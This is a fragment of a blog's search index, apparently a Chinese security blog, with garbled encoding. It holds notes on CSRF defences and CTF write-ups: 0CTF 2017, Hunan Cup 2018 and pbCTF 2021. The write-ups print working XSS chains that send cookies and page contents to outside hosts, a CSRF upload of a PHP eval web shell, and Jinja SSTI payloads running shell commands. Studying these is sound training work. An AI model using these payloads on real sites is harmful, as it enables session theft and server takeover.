action=allow proxychains rdesktop 10.0.10.110 ","date":"2022-04-24T22:08:10+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/","section":"posts","tags":["æ¸—é€é¶æœº"],"title":"vluntargetAé¶åœºç¬”è®°"},{"categories":["NOTES\u0026SUMMARY"],"contents":"å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆäºŒï¼‰ï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ\nSelf-XSS å˜åºŸä¸ºå®çš„åœºæ™¯\nCSRF è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ„é€ æ¶æ„é¡µé¢è®©å—å®³è€…ç‚¹å‡»ï¼Œå†’ç”¨å—å®³è€…æœ¬åœ°çš„å‡­è¯ä¿¡æ¯æ‰§è¡Œéœ€è¦æˆæƒçš„ç‰¹å®šæ“ä½œï¼ˆå¦‚æ³¨é”€è´¦å·ç­‰ï¼‰ï¼ŒæŠŠæ”»å‡»è€…æ„é€ çš„è¯·æ±‚å½“ä½œå—å®³è€…è‡ªå·±å®Œæˆçš„è¯·æ±‚ï¼Œå±å®³å¾ˆå¤§\nå¸¸è§ç±»å‹ GETç±»å‹ \u0026lt;img src=\u0026#34;http://bank.example/withdraw?amount=10000\u0026amp;for=hacker\u0026#34; \u0026gt; POSTç±»å‹ burpsuitå¯ç›´æ¥ç”Ÿæˆï¼Œå†æœ«å°¾å¯ä»¥åŠ ä¸Š\n\u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; å°†ä¼šæ¨¡æ‹Ÿç”¨æˆ·çš„POSTæ“ä½œç›´æ¥å‘åŒ…\né˜²æŠ¤\u0026amp;ç»•è¿‡ å«CSRF payloadçš„é¡µé¢ä¸€èˆ¬æ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œå¹¶ä¸”ä¸èƒ½è·å–åˆ°cookieç­‰å‡­æ®ä¿¡æ¯ï¼Œåªèƒ½ä½¿ç”¨\né’ˆå¯¹è¿™äº›ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹çš„é˜²æŠ¤ç­–ç•¥ï¼ˆå½“ç„¶ä¼šæœ‰ç›¸åº”çš„å¯¹æŠ—æªæ–½ï¼‰\nåŒæºæ£€æµ‹ è¯·æ±‚å¤´ HTTPçš„è¯·æ±‚åŒ…ä¸­åŒ…å«è¿™æ ·ä¸¤ä¸ªHeader\nOrigin: Referer: ä¸¤ä¸ªè¯·æ±‚å¤´ç†è®ºä¸Šéƒ½ä¸èƒ½ç”±å‰ç«¯æ¥éšä¾¿ä¿®æ”¹ï¼Œä¸¤è€…éƒ½å¯ä»¥ç”¨æ¥ç¡®å®šè¯·æ±‚çš„æ¥æºåŸŸï¼Œä½†ç•¥æœ‰åŒºåˆ«\nOriginï¼šè¯·æ±‚çš„åŸŸåï¼Œä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸å­˜åœ¨ IE11ä¸ä¼šåœ¨è·¨ç«™CORSè¯·æ±‚ä¸Šæ·»åŠ Originè¯·æ±‚å¤´\n302é‡å®šå‘\nRefererï¼šè¯·æ±‚çš„æ¥æºåœ°å€ï¼Œæœ‰ä»¥ä¸‹5ç§ç­–ç•¥ ç­–ç•¥å å±æ€§ - æ–° å±æ€§ - æ—§ No Referer no-Referer never No Referer When Downgrade no-Referer-when-downgrade default Origin Only (same or strict)origin origin Origin When Cross Origin (strict)origin-when-crossorigin - Unsafe URL unsafe-url always æˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºsame-originï¼Œè¡¨æ ¼å› æ­¤éœ€è¦æŠŠReferrer Policyçš„ç­–ç•¥è®¾ç½®æˆsame-originï¼Œå¯¹äºåŒæºçš„é“¾æ¥å’Œå¼•ç”¨ï¼Œä¼šå‘é€Refererï¼Œrefererå€¼ä¸ºHostä¸å¸¦Pathï¼›è·¨åŸŸè®¿é—®åˆ™ä¸æºå¸¦Refererï¼›ä¾‹å¦‚ï¼šaaa.comå¼•ç”¨bbb.comçš„èµ„æºï¼Œä¸ä¼šå‘é€Referer\nè®¾ç½®æ–¹å¼æœ‰ä¸‰ç§ï¼šCSPè®¾ç½®ï¼›é¡µé¢\u0026lt;meta\u0026gt;æ ‡ç­¾ï¼›\u0026lt;a\u0026gt;æ ‡ç­¾å¢åŠ referer policyå±æ€§\nä»¥ä¸‹å‡ ç§æƒ…å†µä¸å«Refererï¼š\nHTTPS-\u0026gt;HTTPï¼›IE6,7ä¸‹çš„window.location.hrefå’Œwindow.openéƒ½ä¼šä¸¢å¤±ï¼›Flashåˆ°å¦ä¸€ä¸ªç½‘ç«™æ—¶Refereræ¯”è¾ƒæ‚ä¹±ï¼›\u0026lt;a\u0026gt;æ ‡ç­¾è®¾ç½®refererpolicy=\u0026ldquo;no-referer\u0026rdquo;\nCSRF Token è¦æ±‚ç”¨æˆ·è¯·æ±‚æºå¸¦ä¸€ä¸ªæ”»å‡»è€…æ— æ³•è·å–åˆ°çš„Tokenï¼ŒæœåŠ¡å™¨é€šè¿‡æ ¡éªŒTokenæ¥åŒºåˆ†æ­£å¸¸è¯·æ±‚å’Œæ”»å‡»è¯·æ±‚ï¼›Tokenä¸å­˜åœ¨äºcookieä¸­ï¼ˆå¦åˆ™åˆä¼šè¢«å†’ç”¨ï¼‰ï¼Œå­˜äºæœåŠ¡å™¨çš„sessionä¸­\næ·»åŠ token éå†DOMï¼Œå¯¹äºDOMä¸­æ‰€æœ‰çš„\u0026lt;a\u0026gt;å’Œ\u0026lt;form\u0026gt;æ ‡ç­¾ååŠ å…¥token\nå¯¹äºé¡µé¢åŠ è½½ååŠ¨æ€ç”Ÿæˆçš„HTMLæ²¡æœ‰åŠæ³•\néªŒè¯ç æˆ–å¯†ç ä¹Ÿå¯ä»¥å……å½“è¿™æ ·çš„æ•ˆæœ\næ£€éªŒtoken æœåŠ¡ç«¯è¿›è¡Œæ ¡éªŒ\nç¼ºç‚¹ å®ç°æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦ç»™æ¯ä¸€ä¸ªé¡µé¢éƒ½å†™å…¥Tokenï¼ˆå‰ç«¯æ— æ³•ä½¿ç”¨çº¯é™æ€é¡µé¢ï¼‰ï¼Œæ¯ä¸€ä¸ªFormåŠAjaxè¯·æ±‚éƒ½æºå¸¦è¿™ä¸ªTokenï¼Œåç«¯å¯¹æ¯ä¸€ä¸ªæ¥å£éƒ½è¿›è¡Œæ ¡éªŒï¼Œå¹¶ä¿è¯é¡µé¢TokenåŠè¯·æ±‚Tokenä¸€è‡´ï¼Œè¿™å°±ä½¿å¾—è¿™ä¸ªé˜²æŠ¤ç­–ç•¥ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€æ‹¦æˆªå¤„ç†ï¼Œè€Œéœ€è¦æ¯ä¸€ä¸ªé¡µé¢å’Œæ¥å£éƒ½æ·»åŠ å¯¹åº”çš„è¾“å‡ºå’Œæ ¡éªŒã€‚è¿™ç§æ–¹æ³•å·¥ä½œé‡å·¨å¤§ï¼Œä¸”æœ‰å¯èƒ½é—æ¼\ncookieç›¸å…³å‰ç½® Weak Confidentiality\ncookieä½¿ç”¨domainå’Œpathä½œä¸ºåŒæºé™åˆ¶ï¼Œä¸åŒºåˆ†ç«¯å£å’Œåè®®(http/https)ï¼›pathå‘ä¸‹é€šé…ï¼›domainæ˜¯å‘ä¸Šé€šé…çš„ï¼Œæ‰€ä»¥å­åŸŸåå¯ä»¥å†™cookieåˆ°çˆ¶åŸŸï¼› // a.b.com cookie = \u0026#34;trash;domain=.b.com;\u0026#34; phpå¤„ç†åŒåcookieï¼Œå–å‰è€… Tornadoå¤„ç†åŒåcookieï¼Œåè€…è¦†ç›–å‰è€…ï¼›å¯åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡ŒCSRF å‚è€ƒï¼šçŸ¥ä¹æŸå¤„XSS+åˆ·ç²‰è¶…è¯¦ç»†æ¼æ´æŠ€æœ¯åˆ†æ\nå¯ä»¥é€šè¿‡è®¾ç½®pathæ¥è°ƒæ•´ä¼˜å…ˆçº§ pathç›¸åŒé•¿åº¦ï¼Œåˆ›å»ºæ—¶é—´æ›´æ—©æ›´ä¼˜å…ˆï¼›pathæ›´é•¿æ›´ä¼˜å…ˆ\npath = /admin path = /admin/\tä¼˜å…ˆ æ¯ä¸€ä¸ªcookieéƒ½æœ‰ä¸ä¹‹ç›¸å…³çš„åŸŸï¼Œè¿™ä¸ªåŸŸçš„èŒƒå›´ä¸€èˆ¬é€šè¿‡domainå±æ€§æŒ‡å®š å¦‚æœåŸŸä¸é¡µé¢çš„åŸŸç›¸åŒï¼Œç§°ä¸ºç¬¬ä¸€æ–¹cookieï¼Œä¸åŒåˆ™ç§°ä¸ºç¬¬ä¸‰æ–¹cookieï¼›ä¸€ä¸ªé¡µé¢åŒ…å«å›¾ç‰‡æˆ–å­˜æ”¾å…¶å®ƒåŸŸä¸Šçš„èµ„æºæ—¶ï¼Œç¬¬ä¸€æ–¹çš„cookieä¹Ÿåªä¼šå‘é€åˆ°è®¾ç½®å®ƒä»¬çš„æœåŠ¡å™¨\nXSS + CSRF æ”»å‡»æµç¨‹\né¦–å…ˆä¸€ä¸ªxssè§¦å‘ç‚¹ payloadä¸­åŒ…å«iframeï¼Œåœ¨æ¡†æ¶å†…è®©å—å®³è€…è¿›è¡ŒCSRF ä¸»è¦çœ‹ä¸‹é¢çš„ä¾‹é¢˜å°±å®Œäº‹äº†\nin CTF [0CTF 2017]complicated xss æœ‰ä¸¤ä¸ªç«™ http://admin.government.vip:8000ï¼ˆæœ‰flagï¼‰å’Œhttp://government.vip/ï¼ˆä¸»ç«™ï¼‰\nä¸»ç«™æœ‰xssç‚¹ï¼Œæ— é˜²æŠ¤ï¼Œæ˜¯åœ¨å½“å‰çš„ä¸»ç«™ç‚¹è§¦å‘xss\nadminçš„é‚£ä¸ªå­åŸŸçš„ç«™æœ‰ç™»å½•æ¡†ï¼Œé»˜è®¤test: testå¼±å£ä»¤å¯ä»¥ä½æƒé™ç™»å…¥ï¼Œç™»å…¥åå‘ç°cookieçš„usernameå­—æ®µæœ‰xssç‚¹ï¼ˆå†…å®¹è¾“å‡ºåˆ°é¡µé¢çš„\u0026lt;h1\u0026gt;æ ‡ç­¾ä¸­ï¼‰ï¼Œä¸è¿‡é¡µé¢å­˜åœ¨æ²™ç®±\n\u0026lt;script\u0026gt; //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; \u0026lt;/script\u0026gt; å·¥ä½œæ–¹å¼æ˜¯åˆ é™¤äº†å¾ˆå¤šwindow.è¿™æ ·çš„å‡½æ•°\nadminå­åŸŸç«™è¿˜æœ‰uploadçš„åŠŸèƒ½ ä½†æ˜¯åªèƒ½adminè´¦æˆ·æ‰å¯ç™»å…¥ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—ä¸Šä¼ éƒ¨åˆ†çš„ä»£ç æ¥ç¡®å®šæˆ‘ä»¬çš„payloadæ„æˆï¼Œä½†æ˜¯ç”±äºwebçš„SOPåŒæºç­–ç•¥ï¼Œæ‰€ä»¥ä¸¤ä¸ªç«™è·¨åŸŸ è¯»ä¸åˆ°cookie\nè¿™é‡Œè¦å€ŸåŠ©cookieä¸­çš„SOPç­–ç•¥äº†ï¼Œä»…æ ¹æ®domain+pathæ¥åŒºåˆ†ï¼Œä¸ä¾æ®port+protocolï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å­åŸŸä¿®æ”¹çˆ¶åŸŸçš„cookieå€¼\ncookie=\u0026#34;username=\u0026lt;XSS code\u0026gt;;domain=.government.vip;\u0026#34; åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè®¿é—®adminå­åŸŸç«™æ—¶å°±ä¼šæºå¸¦ä»¥ä¸‹ä¸¤æ¡cookie\nusername=\u0026#34;XSS; domain=.government.vip\u0026#34; username=\u0026#34;test; domain=admin.government.vip; path=/\u0026#34; ç”±äºcookieçš„è¯»å–æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰€ä»¥ä¸Šé¢ä¸¤æ¡cookieåœ¨è¢«åç«¯è§£ææ—¶å®Œå…¨ç›¸åŒï¼Œé€‰å–å“ªæ¡cookieå®Œå…¨å–å†³äºåç«¯ä»£ç çš„å®ç°ï¼Œå“åº”å¤´æŒ‡å‡ºåç«¯æ¡†æ¶æ˜¯TornadoServer/4.4.2ï¼Œä¼šå¯¼è‡´åŒåcookieåè€…è¦†ç›–å‰è€…ï¼Œä½¿æˆ‘ä»¬çš„æ”»å‡»å®ç°\nç»“åˆä¸Šé¢çš„ï¼Œæˆ‘ä»¬çš„å¤§è‡´æ€è·¯æ˜¯è¿™æ ·çš„ï¼š\nä¸»ç«™xssæ¥è®¾ç½®adminå­åŸŸç«™çš„cookieå€¼ ç„¶åå†è·³è½¬åˆ°adminå­åŸŸç«™ å€Ÿç”±è¿™é‡Œcookieçš„xssè§¦å‘ç¬¬äºŒä¸ªxss\n\u0026lt;script\u0026gt;xss=\u0026#34;\u0026lt;script src=//vps-ip/xss/test.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.cookie=\u0026#34;username=\u0026#34;+xss+\u0026#34;testxss;domain=.government.vip;path=\\/;\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;location.href=\u0026#39;http://admin.government.vip:8000/\u0026#39;;\u0026lt;/script\u0026gt; test.js è·å–cookie\nlocation.href=\u0026#39;http://webhook/?cookie=\u0026#39;+escape(document.cookie); å¯ä»¥æˆåŠŸè·å–æ•°æ®\n[Tue Mar 21 20:13:35 2017] 202.120.7.205:47632 [200]: /xss/xss_new.php?cookie=username%3Dadmin%3B%20username%3D%3Cscript%20src%3D//121.42.175.111%3A8080/xss/test.js%3E%3C/script%3Etestxss adminçš„sessionidè®¾ç½®äº†HttpOnlyï¼Œæˆ‘ä»¬è¿˜å¾—CSRF\nç”±äºadminå­åŸŸç«™åˆ é™¤äº†ä¸€äº›å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨iframeçš„éªšæ“ä½œæ¥ç»•è¿‡\n\u0026lt;iframe id=\u0026#34;sandbox\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; window.XMLHttpRequest=document.getElementById(\u0026#39;sandbox\u0026#39;).contentWindow.XMLHttpRequest; å¯ä»¥æ„é€ ajaxæ¥è¯»adminçš„é¡µé¢æºç \n\u0026lt;script\u0026gt;xss = \u0026#34;\u0026lt;iframe id=\\\u0026#34;sandbox\\\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=//vps-ip/xss/test.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.cookie=\u0026#34;username=\u0026#34;+xss+\u0026#34;testxss;domain=.government.vip;path=\\/;\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;location.href=\u0026#39;http://admin.government.vip:8000/\u0026#39;;\u0026lt;/script\u0026gt; test.js\nwindow.XMLHttpRequest = document.getElementById(\u0026#39;sandbox\u0026#39;).contentWindow.XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function(){ if(xhr.readyState==4){ if(xhr.status==200){ data = xhr.responseText; imgsrc=document.createElement(\u0026#34;img\u0026#34;); imgsrc.src = \u0026#34;http://webhook/?cookie=\u0026#34; + escape(data); } } }; xhr.open(\u0026#34;get\u0026#34;,\u0026#34;/\u0026#34;); xhr.send(); å¯ä»¥è·å¾—ç®¡ç†å‘˜é¡µé¢ä»£ç \n\u0026lt;!doctype html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Admin Panel\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt; //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1\u0026gt;Hello \u0026lt;iframe id=\u0026#34;sandbox\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=//vps-ip/xss/test.js\u0026gt;\u0026lt;/script\u0026gt;testxss\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Upload your shell\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;/upload\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;/input\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;upload\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; è¿™ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œå°±éœ€è¦csrfï¼Œä¸è¿‡ç”±äºé¡µé¢ä¸Šçš„XHRè¢«ç¦ç”¨ï¼Œæ‰€ä»¥å¾—é¢å¤–è°ƒç”¨å‡ºæ¥\ntest.js\nwindow.XMLHttpRequest = document.getElementById(\u0026#39;sandbox\u0026#39;).contentWindow.XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function(){ if(xhr.readyState==4){ //if(xhr.status==200){ res_status = \u0026#34;status: \u0026#34; + xhr.status + \u0026#34;\\n\u0026#34;; data = xhr.responseText; imgsrc=document.createElement(\u0026#34;img\u0026#34;); imgsrc.src = \u0026#34;http://121.42.175.111:8080/xss/xss_new.php?cookie=\u0026#34; + escape(res_status) + escape(data); //} } }; var formData = new FormData(); var content = \u0026#39;\u0026lt;?php @eval($_POST[c][/c]);?\u0026gt;\u0026#39;; var blob = new Blob([content], { type: \u0026#34;text/plain\u0026#34;}); formData.append(\u0026#34;file\u0026#34;, blob,\u0026#39;angelwhutestshell.php\u0026#39;); xhr.open(\u0026#34;POST\u0026#34;, \u0026#34;/upload\u0026#34;); xhr.send(formData); é…åˆä¸»ç«™çš„xss payload\n\u0026lt;script\u0026gt;xss = \u0026#34;\u0026lt;iframe id=\\\u0026#34;sandbox\\\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=//******/xss/test.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.cookie=\u0026#34;username=\u0026#34;+xss+\u0026#34;testxss;domain=.government.vip;path=\\/;\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;location.href=\u0026#39;http://admin.government.vip:8000/\u0026#39;;\u0026lt;/script\u0026gt; å°±å¯ä»¥è·å¾—flagäº†\nå‚è€ƒï¼šwp | wp2 | wp3 | çŸ¥ä¹æŸå¤„XSS+åˆ·ç²‰è¶…è¯¦ç»†æ¼æ´æŠ€æœ¯åˆ†æ\n[æ¹–æ¹˜æ¯ 2018]XmeO é¢„æœŸ - SSTI {\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls -r /*/*\u0026#34;).read()\u0026#39;)}} å‘ç°webç›®å½•ä¸º/home/XmeOï¼Œç„¶ågrepæœç´¢flagå­—ç¬¦\n{{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;grep hxb2018{ /home/XmeO/*\u0026#34;).read()\u0026#39;)}} éé¢„æœŸ - xss é€šè¿‡æŸ¥çœ‹è¿›ç¨‹å‘ç°è¿è¡Œç€\nåœ¨/static/assets/js/me.jsä¸­å’Œä¸Šé¢0CTFé‚£ä¸ªé¢˜æœ‰ä¸€æ ·çš„æ²™ç›’æƒ…å†µï¼Œå“åº”å¤´\nscript-src \u0026#39;self\u0026#39; è¯´æ˜ä¸å…è®¸å†…è”è„šæœ¬æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç›´æ¥åµŒå¥—åœ¨\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;ä¸­çš„ä»£ç æ— æ³•è¢«æ‰§è¡Œï¼Œè€Œ\u0026lt;script src='url'\u0026gt;\u0026lt;/script\u0026gt;ä¸­çš„ä»£ç å°†è¢«æ‰§è¡Œï¼Œè€Œä¸”å¿…é¡»åŒæºï¼ˆå¾ˆç»å…¸çš„ç»•è¿‡æ–¹å¼ï¼Œä¹Ÿå¯æ¢æˆiframe\nåå°è¯·æ±‚çš„urlä¸ºhttp://127.0.0.1:7443/admin/ï¼Œæäº¤xss payload\n\u0026lt;/div\u0026gt; \u0026lt;script src=http://127.0.0.1:7443/show/591b111c-096d-11eb-97c4-0242ac110003\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div\u0026gt; è·å–åˆ°hint\n/?hint=Try%20to%20get%20admin\u0026#39;s%20page%20content ç”±äºé¡µé¢çš„æ²™ç›’è®¾ç½®ï¼Œæˆ‘ä»¬åˆ©ç”¨ä¸Šé¢çš„åŒæ¬¾æ–¹å¼è¿›è¡Œç»•è¿‡\nvar ifm = document.createElement(\u0026#39;iframe\u0026#39;); ifm.setAttribute(\u0026#39;src\u0026#39;,\u0026#39;/admin/\u0026#39;); document.body.appendChild(ifm); window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; var xhr = new XMLHttpRequest();xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;http://127.0.0.1:7443/admin/\u0026#34;,false); xhr.send(); c=xhr.responseText; window.location.href=\u0026#34;http://192.168.0.134:8889/?c=\u0026#34;+c; ä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„hint\n/?c=%20%20%20%20This%20website%20also%20have%20another%20page%20named%20mysecrecy_directory...... é—®é¢˜è½¬å˜ä¸ºè·å–/admin/mysecrecy_directoryä¸‹çš„cookieå†…å®¹\nvar f= document.createElement(\u0026#39;iframe\u0026#39;); f.setAttribute(\u0026#39;src\u0026#39;,\u0026#39;/admin/mysecrecy_directory\u0026#39;); document.body.appendChild(f); f.onload = function(){ var a= f.contentWindow.document.cookie; location.href = \u0026#34;http://192.168.0.134:8889/?\u0026#34;+a; payloadåªéœ€è¦æŠŠä¹‹å‰çš„srcæ”¹ä¸€ä¸‹ï¼Œåœ¨iframeåŠ è½½çš„åŒæ—¶è·å–iframeä¸­çš„cookieï¼Œå¹¶åˆ©ç”¨hrefè·³è½¬è·å–flag\nå‚è€ƒï¼šwp\n[uiuCTF 2021]YANA å†™è¿‡å¤ªå¤šæ¬¡äº†ï¼Œä¸è¯¦ç»†å±•å¼€äº†ï¼›å…³äºç¼“å­˜æŠ•æ¯’ + å­åŸŸåæ¥ç®¡ + XS-Leaks â‰ˆ å¯„\n[pbCTF 2021]TBDXSS æ•‘å•Š åˆæ˜¯xss ç»™å‡ºäº†è¯¦ç»†çš„æºç ï¼Œapp.py+bot.js\nhttps://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss\nhttps://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html\nhttps://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS\nfrom flask import Flask, request, session, jsonify, Response import json import redis import random import os import time app = Flask(__name__) app.secret_key = os.environ.get(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;tops3cr3t\u0026#34;) # session secret key app.config.update( SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE=\u0026#39;Lax\u0026#39;, # samesite cookie lax ) HOST = os.environ.get(\u0026#34;CHALL_HOST\u0026#34;, \u0026#34;localhost:5000\u0026#34;) r = redis.Redis(host=\u0026#39;redis\u0026#39;) # åç«¯redisæ•°æ®åº“ @app.after_request def add_XFrame(response): response.headers[\u0026#39;X-Frame-Options\u0026#39;] = \u0026#34;DENY\u0026#34; # è¯¥é¡µé¢ä¸å…è®¸è¢«ä»»ä½•é¡µé¢å¼•ç”¨ï¼Œä¹Ÿä¸å…è®¸å¼•ç”¨ä»»ä½•é¡µé¢ return response @app.route(\u0026#39;/change_note\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) # ä¿®æ”¹sessionä¸­çš„note def add(): session[\u0026#39;note\u0026#39;] = request.form[\u0026#39;data\u0026#39;] session.modified = True return \u0026#34;Changed succesfully\u0026#34; @app.route(\u0026#34;/do_report\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def do_report(): cur_time = time.time() ip = request.headers.get(\u0026#39;X-Forwarded-For\u0026#39;).split(\u0026#34;,\u0026#34;)[-2].strip() # amazing google load balancer last_time = r.get(\u0026#39;time.\u0026#39;+ip) # åˆ¤æ–­ä¸ŠæŠ¥æ—¶é—´é—´éš” last_time = float(last_time) if last_time is not None else 0 time_diff = cur_time - last_time if time_diff \u0026gt; 6: r.rpush(\u0026#39;submissions\u0026#39;, request.form[\u0026#39;url\u0026#39;]) # å°†ä¸ŠæŠ¥urlå­˜å…¥redisæ•°æ®åº“ä¸­ r.setex(\u0026#39;time.\u0026#39;+ip, 60, cur_time) return \u0026#34;submitted\u0026#34; return \u0026#34;rate limited\u0026#34; @app.route(\u0026#39;/note\u0026#39;) # noteå…¨éƒ¨å­˜sessionä¸­ åœ¨æœ¬åœ° def notes(): print(session) return \u0026#34;\u0026#34;\u0026#34; \u0026lt;body\u0026gt; {} \u0026lt;/body\u0026gt; \u0026#34;\u0026#34;\u0026#34;.format(session[\u0026#39;note\u0026#39;]) @app.route(\u0026#34;/report\u0026#34;, methods=[\u0026#39;GET\u0026#39;]) # ä¸ŠæŠ¥admin è½¬è‡³/do_report def report(): return \u0026#34;\u0026#34;\u0026#34; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Notes app\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;\u0026lt;a href=\u0026#34;/note\u0026#34;\u0026gt;Get Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Change Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/report\u0026#34;\u0026gt;Report Link\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;h3\u0026gt;Please report suspicious URLs to admin\u0026lt;/h3\u0026gt; \u0026lt;form action=\u0026#34;/do_report\u0026#34; id=\u0026#34;reportform\u0026#34; method=POST\u0026gt; URL: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;url\u0026#34; placeholder=\u0026#34;URL\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#39;/\u0026#39;) # é¦–é¡µ def index(): return \u0026#34;\u0026#34;\u0026#34; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Notes app\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;\u0026lt;a href=\u0026#34;/note\u0026#34;\u0026gt;Get Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Change Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/report\u0026#34;\u0026gt;Report Link\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;h3\u0026gt; Add a note \u0026lt;/h3\u0026gt; \u0026lt;form action=\u0026#34;/change_note\u0026#34; id=\u0026#34;noteform\u0026#34; method=POST\u0026gt; \u0026lt;textarea rows=\u0026#34;10\u0026#34; cols=\u0026#34;100\u0026#34; name=\u0026#34;data\u0026#34; form=\u0026#34;noteform\u0026#34; placeholder=\u0026#34;Note\u0026#39;s content\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026#34;\u0026#34;\u0026#34; ä¸‹é¢æ˜¯bot.js\nconst redis = require(\u0026#39;redis\u0026#39;); const r = redis.createClient({ port : 6379, // replace with your port host : \u0026#39;redis\u0026#39;, // replace with your hostanme or IP address }) const puppeteer = require(\u0026#39;puppeteer\u0026#39;); async function browse(url){ console.log(`Browsing -\u0026gt; ${url}`); const browser = await (await puppeteer.launch({ headless: true, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-gpu\u0026#39;] })).createIncognitoBrowserContext(); // æ— å¤´æ¨¡å¼ const page = await browser.newPage(); await page.setCookie({ name: \u0026#39;session\u0026#39;, value: process.env.CHALL_COOKIE, domain: process.env.CHALL_HOST, sameSite: \u0026#34;Lax\u0026#34;, // samesite cookie lax è­¦æƒ• secure: true, }); try { const resp = await page.goto(url, 